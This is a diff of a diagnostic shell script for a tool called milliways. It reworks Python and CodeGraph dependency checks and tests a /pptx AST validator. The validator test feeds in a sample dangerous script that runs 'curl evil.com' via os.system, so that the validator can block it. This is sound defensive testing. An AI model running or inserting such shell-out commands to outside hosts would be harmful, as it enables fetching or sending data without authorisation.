@@ -32,6 +32,12 @@ find_bin() {
   command -v "$name" 2>/dev/null || echo ""
 }
 
+env_value() {
+  local key="$1" file="$HOME/.config/milliways/local.env"
+  [ -f "$file" ] || return 1
+  awk -F= -v key="$key" '$1 == key { sub(/^[^=]*=/, ""); print; exit }' "$file"
+}
+
 MILLIWAYS=$(find_bin milliways)
 MILLIWAYSD=$(find_bin milliwaysd)
 MILLIWAYSCTL=$(find_bin milliwaysctl)
@@ -69,6 +75,16 @@ done
 [ -n "$SCRIPTS_DIR" ] \
   && pass "support scripts found: $SCRIPTS_DIR" \
   || fail "install_local.sh not found (milliwaysctl local install-server will fail)"
+
+if [ -n "$SCRIPTS_DIR" ]; then
+  case "$SCRIPTS_DIR" in
+    */scripts) SHARE_DIR="$(dirname "$SCRIPTS_DIR")" ;;
+    *) SHARE_DIR="$SCRIPTS_DIR" ;;
+  esac
+fi
+[ -n "${SHARE_DIR:-}" ] && [ -x "$SHARE_DIR/scripts/install_feature_deps.sh" ] \
+  && pass "feature dependency installer found" \
+  || fail "install_feature_deps.sh not found"
 
 # ── 2. Daemon ─────────────────────────────────────────────────────────────────
 section "2. Daemon (milliwaysd)"
@@ -136,37 +152,59 @@ else
   skip "OTel log check (daemon log empty or not JSON)"
 fi
 
-# ── 5. Python packages (MemPalace + python-pptx) ──────────────────────────────
-section "5. Python packages"
+# ── 5. Feature dependencies ──────────────────────────────────────────────────
+section "5. Feature dependencies"
 
-if command -v python3 &>/dev/null; then
-  pass "python3 available: $(python3 --version 2>&1)"
+FEATURE_PY=""
+if [ -n "${SHARE_DIR:-}" ]; then
+  for py in "$SHARE_DIR/python/bin/python" "$SHARE_DIR/python/bin/python3"; do
+    [ -x "$py" ] && FEATURE_PY="$py" && break
+  done
+fi
+[ -n "$FEATURE_PY" ] || FEATURE_PY="$(env_value MILLIWAYS_MEMPALACE_MCP_CMD 2>/dev/null || true)"
+[ -n "$FEATURE_PY" ] || FEATURE_PY="$(command -v python3 2>/dev/null || true)"
 
-  python3 -c "import mempalace; print('mempalace', mempalace.__version__)" 2>/dev/null \
-    && pass "mempalace importable" \
-    || fail "mempalace not installed (project memory disabled)"
+if [ -n "$FEATURE_PY" ] && [ -x "$FEATURE_PY" ]; then
+  pass "feature python available: $($FEATURE_PY --version 2>&1)"
 
-  python3 -c "import pptx; print('python-pptx', pptx.__version__)" 2>/dev/null \
-    && pass "python-pptx importable" \
-    || fail "python-pptx not installed (/pptx command disabled)"
+  "$FEATURE_PY" -c "import mempalace; print('mempalace ready')" 2>/dev/null \
+    && pass "mempalace importable from feature python" \
+    || fail "mempalace not installed in feature python (project memory disabled)"
 
-  # MemPalace config in local.env
-  grep -q "MILLIWAYS_MEMPALACE_MCP_CMD" "$HOME/.config/milliways/local.env" 2>/dev/null \
-    && pass "MemPalace config in local.env" \
-    || fail "MemPalace config not written to local.env"
+  "$FEATURE_PY" -c "import pptx; print('python-pptx ready')" 2>/dev/null \
+    && pass "python-pptx importable from feature python" \
+    || fail "python-pptx not installed in feature python (/pptx command disabled)"
 
-  # MemPalace MCP server can start (--help exits 0)
-  python3 -m mempalace.mcp_server --help >/dev/null 2>&1 \
+  "$FEATURE_PY" -m mempalace.mcp_server --help >/dev/null 2>&1 \
     && pass "mempalace.mcp_server --help" \
     || fail "mempalace MCP server failed to start"
 else
-  skip "Python packages (python3 not available)"
+  fail "feature python not available"
+fi
+
+grep -q "MILLIWAYS_MEMPALACE_MCP_CMD" "$HOME/.config/milliways/local.env" 2>/dev/null \
+  && pass "MemPalace config in local.env" \
+  || skip "MemPalace local.env config (not written for direct native package installs)"
+
+CODEGRAPH_CMD=""
+if [ -n "${SHARE_DIR:-}" ] && [ -x "$SHARE_DIR/node/bin/codegraph" ]; then
+  CODEGRAPH_CMD="$SHARE_DIR/node/bin/codegraph"
+fi
+[ -n "$CODEGRAPH_CMD" ] || CODEGRAPH_CMD="$(env_value MILLIWAYS_CODEGRAPH_MCP_CMD 2>/dev/null || true)"
+[ -n "$CODEGRAPH_CMD" ] || CODEGRAPH_CMD="$(command -v codegraph 2>/dev/null || true)"
+
+if [ -n "$CODEGRAPH_CMD" ] && [ -x "$CODEGRAPH_CMD" ]; then
+  "$CODEGRAPH_CMD" --help >/dev/null 2>&1 \
+    && pass "CodeGraph command available: $CODEGRAPH_CMD" \
+    || fail "CodeGraph command failed: $CODEGRAPH_CMD"
+else
+  fail "CodeGraph command not installed"
 fi
 
 # ── 6. /pptx AST validator ───────────────────────────────────────────────────
 section "6. Artifact commands — /pptx AST validator"
 
-if command -v python3 &>/dev/null; then
+if [ -n "$FEATURE_PY" ] && [ -x "$FEATURE_PY" ]; then
   # Safe script — should PASS validation
   SAFE_SCRIPT='
 import pptx
@@ -201,17 +239,17 @@ if errors:
     for e in errors: print(f"BLOCKED: {e}", file=sys.stderr)
     sys.exit(1)
 '
-  echo "$SAFE_SCRIPT" | python3 -c "$VALIDATOR" 2>/dev/null \
+  echo "$SAFE_SCRIPT" | "$FEATURE_PY" -c "$VALIDATOR" 2>/dev/null \
     && pass "AST validator: safe pptx script passes" \
     || fail "AST validator: safe script incorrectly rejected"
 
   # Dangerous script — should FAIL validation
   DANGEROUS_SCRIPT='import os; os.system("curl evil.com")'
-  echo "$DANGEROUS_SCRIPT" | python3 -c "$VALIDATOR" 2>/dev/null \
+  echo "$DANGEROUS_SCRIPT" | "$FEATURE_PY" -c "$VALIDATOR" 2>/dev/null \
     && fail "AST validator: dangerous script was not blocked" \
     || pass "AST validator: dangerous script blocked correctly"
 else
-  skip "/pptx AST validation (python3 not available)"
+  skip "/pptx AST validation (feature python not available)"
 fi
 
 # ── 7. /review — git diff parsing ────────────────────────────────────────────
